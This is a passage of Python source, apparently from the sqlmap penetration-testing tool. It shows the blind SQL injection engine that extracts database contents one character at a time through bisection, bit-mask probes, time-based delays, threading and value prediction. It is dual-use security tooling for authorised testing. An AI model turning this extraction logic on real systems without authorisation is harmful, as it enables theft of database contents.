                            charTbl = xrange(charTbl[position], charTbl[-1] + 1)
                    else:
                        maxValue = posValue

                        if not isinstance(charTbl, xrange):
                            charTbl = charTbl[:position]
                        else:
                            charTbl = xrange(charTbl[0], charTbl[position])

                    if len(charTbl) == 1:
                        if maxValue == 1:
                            return None

                        # Going beyond the original charset
                        elif minValue == maxChar:
                            # If the original charTbl was [0,..,127] new one
                            # will be [128,..,(128 << 4) - 1] or from 128 to 2047
                            # and instead of making a HUGE list with all the
                            # elements we use a xrange, which is a virtual
                            # list
                            if expand and shiftTable:
                                charTbl = xrange(maxChar + 1, (maxChar + 1) << shiftTable.pop())
                                originalTbl = xrange(charTbl[0], charTbl[-1] + 1)
                                maxChar = maxValue = charTbl[-1]
                                minValue = charTbl[0]
                            else:
                                kb.disableShiftTable = True
                                return None
                        else:
                            retVal = minValue + 1

                            if retVal in originalTbl or (retVal == ord('\n') and CHAR_INFERENCE_MARK in payload):
                                if (timeBasedCompare or unexpectedCode) and kb.get("timeless") is None and not validateChar(idx, retVal):
                                    if restricted:
                                        # the character fell outside this column's observed range - re-extract
                                        # over the full charset (not timing noise, so no delay increase / retry count)
                                        return getChar(idx, asciiTbl, True, retried=retried)
                                    if not kb.originalTimeDelay:
                                        kb.originalTimeDelay = conf.timeSec

                                    threadData.validationRun = 0
                                    if (retried or 0) < MAX_REVALIDATION_STEPS:
                                        errMsg = "invalid character detected. retrying.."
                                        logger.error(errMsg)

                                        if timeBasedCompare:
                                            if kb.adjustTimeDelay is not ADJUST_TIME_DELAY.DISABLE:
                                                conf.timeSec += 1
                                                warnMsg = "increasing time delay to %d second%s" % (conf.timeSec, 's' if conf.timeSec > 1 else '')
                                                logger.warning(warnMsg)

                                            if kb.adjustTimeDelay is ADJUST_TIME_DELAY.YES:
                                                dbgMsg = "turning off time auto-adjustment mechanism"
                                                logger.debug(dbgMsg)
                                                kb.adjustTimeDelay = ADJUST_TIME_DELAY.NO

                                        return getChar(idx, originalTbl, continuousOrder, expand, shiftTable, (retried or 0) + 1)
                                    else:
                                        errMsg = "unable to properly validate last character value ('%s').." % decodeIntToUnicode(retVal)
                                        logger.error(errMsg)
                                        conf.timeSec = kb.originalTimeDelay
                                        return decodeIntToUnicode(retVal)
                                else:
                                    if timeBasedCompare:
                                        threadData.validationRun += 1
                                        if kb.adjustTimeDelay is ADJUST_TIME_DELAY.NO and threadData.validationRun > VALID_TIME_CHARS_RUN_THRESHOLD:
                                            dbgMsg = "turning back on time auto-adjustment mechanism"
                                            logger.debug(dbgMsg)
                                            kb.adjustTimeDelay = ADJUST_TIME_DELAY.YES

                                    return decodeIntToUnicode(retVal)
                            else:
                                return None
            else:
                if "'%s'" % CHAR_INFERENCE_MARK in payload and conf.charset:
                    errMsg = "option '--charset' is not supported on '%s'" % Backend.getIdentifiedDbms()
                    raise SqlmapUnsupportedFeatureException(errMsg)

                candidates = list(originalTbl)
                bit = 0
                while len(candidates) > 1:
                    bits = {}
                    maxCandidate = max(candidates)
                    maxBits = maxCandidate.bit_length() if maxCandidate > 0 else 1

                    for candidate in candidates:
                        for bit in xrange(maxBits):
                            bits.setdefault(bit, 0)
                            if candidate & (1 << bit):
                                bits[bit] += 1
                            else:
                                bits[bit] -= 1

                    choice = sorted(bits.items(), key=lambda _: abs(_[1]))[0][0]
                    mask = 1 << choice

                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, "&%d%s" % (mask, INFERENCE_GREATER_CHAR)), (expressionUnescaped, idx, 0))
                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(getTechnique())

                    if result:
                        candidates = [_ for _ in candidates if _ & mask > 0]
                    else:
                        candidates = [_ for _ in candidates if _ & mask == 0]

                    bit += 1

                if candidates:
                    forgedPayload = safeStringFormat(payload.replace(INFERENCE_GREATER_CHAR, INFERENCE_EQUALS_CHAR), (expressionUnescaped, idx, candidates[0]))
                    result = Request.queryPage(forgedPayload, timeBasedCompare=timeBasedCompare, raise404=False)
                    incrementCounter(getTechnique())

                    if result:
                        if candidates[0] == 0:      # Trailing zeros
                            return None
                        else:
                            return decodeIntToUnicode(candidates[0])
                    elif restricted:
                        # the self-validating '=' failed: the character is outside this column's observed set
                        # (or is end-of-string) - re-extract over the full charset, which validates the value
                        # and detects end-of-string correctly
                        return getChar(idx, asciiTbl, True, retried=retried)

        # Go multi-threading (--threads > 1)
        if numThreads > 1 and isinstance(length, int) and length > 1:
            threadData.shared.value = [None] * length
            threadData.shared.index = [firstChar]    # As list for python nested function scoping
            threadData.shared.start = firstChar
            threadData.shared.retrieved = 0
            threadData.shared.endIndex = 0

            try:
                def blindThread():
                    threadData = getCurrentThreadData()

                    while kb.threadContinue:
                        with kb.locks.index:
                            if threadData.shared.index[0] - firstChar >= length:
                                return

                            threadData.shared.index[0] += 1
                            currentCharIndex = threadData.shared.index[0]

                        if kb.threadContinue:
                            val = getChar(currentCharIndex, asciiTbl, not (charsetType is None and conf.charset))
                            if val is None:
                                val = INFERENCE_UNKNOWN_CHAR
                        else:
                            break

                        # NOTE: https://github.com/sqlmapproject/sqlmap/issues/4629
                        if not isListLike(threadData.shared.value):
                            break

                        with kb.locks.value:
                            idx = currentCharIndex - 1 - firstChar
                            threadData.shared.value[idx] = val
                            threadData.shared.retrieved += 1
                            if idx > threadData.shared.endIndex:
                                threadData.shared.endIndex = idx
                            currentValue = list(threadData.shared.value)

                        if kb.threadContinue:
                            if showEta:
                                progress.progress(threadData.shared.index[0])
                            elif conf.verbose >= 1:
                                startCharIndex = 0
                                endCharIndex = threadData.shared.endIndex

                                output = ''

                                if endCharIndex > conf.progressWidth:
                                    startCharIndex = endCharIndex - conf.progressWidth

                                count = threadData.shared.start + threadData.shared.retrieved

                                for i in xrange(startCharIndex, endCharIndex + 1):
                                    output += '_' if currentValue[i] is None else filterControlChars(currentValue[i] if len(currentValue[i]) == 1 else ' ', replacement=' ')

                                if startCharIndex > 0:
                                    output = ".." + output[2:]

                                if (endCharIndex - startCharIndex == conf.progressWidth) and (endCharIndex < length - 1):
                                    output = output[:-2] + ".."

                                if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
                                    _ = count - firstChar
                                    output += '_' * (min(length, conf.progressWidth) - len(output))
                                    status = ' %d/%d (%d%%)' % (_, length, int(100.0 * _ / length))
                                    output += status if _ != length else " " * len(status)

                                    dataToStdout("\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), output))

                runThreads(numThreads, blindThread, startThreadMsg=False)

            except KeyboardInterrupt:
                abortedFlag = True

            finally:
                value = [_ for _ in partialValue]
                value.extend(_ for _ in threadData.shared.value)

            infoMsg = None

            # If we have got one single character not correctly fetched it
            # can mean that the connection to the target URL was lost
            if None in value:
                partialValue = "".join(value[:value.index(None)])

                if partialValue:
                    infoMsg = "\r[%s] [INFO] partially retrieved: %s" % (time.strftime("%X"), filterControlChars(partialValue))
            else:
                finalValue = "".join(value)
                infoMsg = "\r[%s] [INFO] retrieved: %s" % (time.strftime("%X"), filterControlChars(finalValue))

            if conf.verbose in (1, 2) and infoMsg and not any((showEta, conf.api, kb.bruteMode)):
                dataToStdout(infoMsg)

        # No multi-threading (--threads = 1)
        else:
            index = firstChar
            threadData.shared.value = ""

            while True:
                index += 1

                # Common prediction feature (a.k.a. "good samaritan")
                # NOTE: to be used only when multi-threading is not set for
                # the moment
                if kb.partRun in NAME_PREDICTION_CONTEXTS and len(partialValue) > 0:
                    val = None
                    commonValue, commonPattern, commonCharset, otherCharset = predictValue(partialValue, asciiTbl)

                    # If a single wordlist entry matches the prefix, confirm
                    # it via equal against the query output
                    if commonValue is not None:
                        # One-shot query containing equals commonValue
                        testValue = unescaper.escape("'%s'" % commonValue) if "'" not in commonValue else unescaper.escape("%s" % commonValue, quote=False)

                        query = getTechniqueData().vector
                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)%s%s" % (expressionUnescaped, INFERENCE_EQUALS_CHAR, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(getTechnique())

                        # Did we have luck?
                        if result:
                            if showEta:
                                progress.progress(len(commonValue))
                            elif conf.verbose in (1, 2) or conf.api:
                                dataToStdout(filterControlChars(commonValue[index - 1:]))

                            finalValue = commonValue
                            break

                    # If there is a common pattern starting with partialValue,
                    # check it via equal against the substring-query output
                    if commonPattern is not None:
                        # Substring-query containing equals commonPattern
                        subquery = queries[Backend.getIdentifiedDbms()].substring.query % (expressionUnescaped, 1, len(commonPattern))
                        testValue = unescaper.escape("'%s'" % commonPattern) if "'" not in commonPattern else unescaper.escape("%s" % commonPattern, quote=False)

                        query = getTechniqueData().vector
                        query = agent.prefixQuery(query.replace(INFERENCE_MARKER, "(%s)=%s" % (subquery, testValue)))
                        query = agent.suffixQuery(query)

                        result = Request.queryPage(agent.payload(newValue=query), timeBasedCompare=timeBasedCompare, raise404=False)
                        incrementCounter(getTechnique())

                        # Did we have luck?
                        if result:
                            val = commonPattern[index - 1:]
                            index += len(val) - 1

                    # Char-by-char fallback. When Huffman is actually active it is driven over the full
                    # (continuous) charset: the corpus-Markov-seeded tree puts the single likeliest next
                    # character at its root (~1 request), subsuming the common/other charset split. When
                    # Huffman is unavailable (--no-huffman, latched off after repeated escapes, or TIME-BASED
                    # where getChar disables it) the classic reordered-charset bisection is used instead - so
                    # the predicted commonCharset ordering is not thrown away (time-based would otherwise pay
                    # full-charset bisection for every character).
                    if not val:
                        if not conf.noHuffman and not kb.disableHuffman and not timeBasedCompare:
                            val = getChar(index, asciiTbl, True)
                        else:
                            if commonCharset:
                                val = getChar(index, commonCharset, False)

                            if not val:
                                val = getChar(index, otherCharset, otherCharset == asciiTbl)
                else:
                    # Time-based dump: once a column's character set has proven closed (unchanged for
                    # DUMP_CHARSET_STABLE_ROWS consecutive rows), search only those
                    # observed ordinals via the bit-search (continuousOrder=False), whose final '=' equality
                    # self-validates the character (no separate validateChar). A narrow-charset column (hex,
                    # digits, dates, decimals) collapses from ~log2(full charset)+1 toward ~log2(set)+1
                    # delayed requests/char. A character outside the observed set makes that '=' fail and is
                    # re-extracted over the full charset (see the restricted escalation in getChar). Time-based
                    # only: boolean has no per-character validation to catch such a miss (and uses Huffman).
                    restrictedTbl = None
                    if (dump and timeBasedCompare and columnKey is not None and charsetType is None and not conf.charset
                            and kb.dumpCharsetStable.get(columnKey, 0) >= DUMP_CHARSET_STABLE_ROWS):
                        with kb.locks.prediction:
                            observed = set(kb.dumpCharset.get(columnKey) or ())   # snapshot (value-parallel safe)
                        if observed and len(observed) <= 64:
                            # include the 0 end-of-string sentinel so end is detected in-band (the bit-search
                            # returns None on 0), avoiding a full-charset escalation at the end of every value
                            restrictedTbl = sorted(observed | set((0,)))

                    if restrictedTbl is not None:
                        val = getChar(index, restrictedTbl, False, expand=False, restricted=True)
                    else:
                        val = getChar(index, asciiTbl, not (charsetType is None and conf.charset))

                if val is None:
                    finalValue = partialValue
                    break

                if kb.data.processChar:
                    val = kb.data.processChar(val)

                threadData.shared.value = partialValue = partialValue + val

                if showEta:
                    progress.progress(index)
                elif (conf.verbose in (1, 2) and not kb.bruteMode) or conf.api:
                    dataToStdout(filterControlChars(val))

                # Note: some DBMSes (e.g. Firebird, DB2, etc.) have issues with trailing spaces
                if Backend.getIdentifiedDbms() in (DBMS.FIREBIRD, DBMS.DB2, DBMS.MAXDB, DBMS.DERBY, DBMS.FRONTBASE) and len(partialValue) > INFERENCE_BLANK_BREAK and partialValue[-INFERENCE_BLANK_BREAK:].isspace():
                    finalValue = partialValue[:-INFERENCE_BLANK_BREAK]
                    break
                elif charsetType and partialValue[-1:].isspace():
                    finalValue = partialValue[:-1]
                    break

                if (lastChar > 0 and index >= lastChar):
                    finalValue = "" if length == 0 else partialValue
                    finalValue = finalValue.rstrip() if len(finalValue) > 1 else finalValue
                    partialValue = None
                    break

    except KeyboardInterrupt:
        abortedFlag = True
    finally:
        kb.prependFlag = False
        retrievedLength = len(finalValue or "")

        if finalValue is not None:
            finalValue = decodeDbmsHexValue(finalValue) if conf.hexConvert else finalValue
            if not (conf.firstChar or conf.lastChar):  # Note: --first/--last give a range-limited (non-complete) output; caching it unmarked would let a later resume serve the truncated value as the full one
                hashDBWrite(expression, finalValue)

            # Adaptive intra-run prediction: remember this extracted name for its enumeration context so
            # later same-context items sharing structure (e.g. wp_posts / wp_users ...) are predicted faster.
            # Fed ONLY single-threaded (not kb.multiThreadMode) so it never mutates the pool while a
            # value-parallel worker is iterating it. Length-capped; a wrong prediction only costs a probe.
            if (kb.partRun in NAME_PREDICTION_CONTEXTS and not kb.multiThreadMode and kb.commonOutputs is not None
                    and 0 < len(finalValue) <= PREDICTION_FEEDBACK_MAX_LENGTH
                    and len(kb.commonOutputs.get(kb.partRun) or ()) < PREDICTION_FEEDBACK_MAX_ITEMS):
                kb.commonOutputs.setdefault(kb.partRun, set()).add(finalValue)
        elif partialValue:
            hashDBWrite(expression, "%s%s" % (PARTIAL_VALUE_MARKER if not conf.hexConvert else PARTIAL_HEX_VALUE_MARKER, partialValue))

    if conf.hexConvert and not any((abortedFlag, conf.api, kb.bruteMode)):
        infoMsg = "\r[%s] [INFO] retrieved: %s  %s\n" % (time.strftime("%X"), filterControlChars(finalValue), " " * retrievedLength)
        dataToStdout(infoMsg)
    else:
        if conf.verbose in (1, 2) and not any((showEta, conf.api, kb.bruteMode)):
            dataToStdout("\n")

        if (conf.verbose in (1, 2) and showEta) or conf.verbose >= 3:
            infoMsg = "retrieved: %s" % filterControlChars(finalValue)
            logger.info(infoMsg)

    if kb.threadException:
        raise SqlmapThreadException("something unexpected happened inside the threads")

    if abortedFlag:
        raise KeyboardInterrupt

    _ = finalValue or partialValue

    # Record this cell for the column's low-cardinality guessing cache (frequency-tracked so the most
    # common values are probed first; bounded so a clearly high-cardinality column stops accumulating).
    if columnKey is not None and finalValue:
        # Track the column's low-cardinality cache and observed character set. Guarded by the prediction
        # lock because value-parallel dump workers update these concurrently.
        ordinals = set(ord(_c) for _c in finalValue if ord(_c) < 128)
        with kb.locks.prediction:
            seen = kb.lowCardCache.setdefault(columnKey, {})
            if finalValue in seen or len(seen) <= LOW_CARDINALITY_THRESHOLD + 2:
                seen[finalValue] = seen.get(finalValue, 0) + 1

            if ordinals:
                existing = kb.dumpCharset.setdefault(columnKey, set())
                grew = not ordinals.issubset(existing)   # did this row introduce a never-seen character?
                existing.update(ordinals)
                # Trust the observed alphabet as closed only after it stays unchanged for several consecutive
                # rows. A column that keeps growing (monotonic PK, high-entropy text) resets the counter and
                # never triggers the restricted search, so it is never charged the miss-then-escalate cost.
                kb.dumpCharsetStable[columnKey] = 0 if grew else kb.dumpCharsetStable.get(columnKey, 0) + 1

    # Oracle-reliability litmus: on bulk extraction (dumps / name enumeration) periodically fire a
    # known-answer differential so an always-true / flaky / degraded channel that would otherwise dump
    # SILENT garbage instead raises a one-time "results may be unreliable" warning. First value is always
    # checked (catch it before a whole bad dump), then every ORACLE_LITMUS_CHECK_EVERY-th.
    if (ORACLE_LITMUS_CHECK_EVERY and finalValue and not kb.reliabilityAlarm and not kb.bruteMode
            and (columnKey is not None or kb.partRun in NAME_PREDICTION_CONTEXTS)):
        with kb.locks.prediction:
            kb.litmusCounter += 1
            due = (kb.litmusCounter == 1 or kb.litmusCounter % ORACLE_LITMUS_CHECK_EVERY == 0)
        if due and not oracleReliabilityLitmus(expressionUnescaped, finalValue, timeBasedCompare):
            kb.reliabilityAlarm = True
            warnMsg = "the target's responses are inconsistent for known-true/known-false probes "
            warnMsg += "(reads-everything-true, WAF, or a flaky/degraded channel); extracted data may "
            warnMsg += "be unreliable. Consider raising '--time-sec', lowering '--threads', or retrying"
            singleTimeWarnMessage(warnMsg)

    return getCounter(getTechnique()), safecharencode(_) if kb.safeCharEncode else _

def queryOutputLength(expression, payload):
    """
    Returns the query output length.
    """

    infoMsg = "retrieving the length of query output"
    logger.info(infoMsg)

    start = time.time()

    lengthExprUnescaped = agent.forgeQueryOutputLength(expression)
    count, length = bisection(payload, lengthExprUnescaped, charsetType=CHARSET_TYPE.DIGITS)

    debugMsg = "performed %d quer%s in %.2f seconds" % (count, 'y' if count == 1 else "ies", calculateDeltaSeconds(start))
    logger.debug(debugMsg)

    if isinstance(length, six.string_types) and length.isspace():
        length = 0

    return length
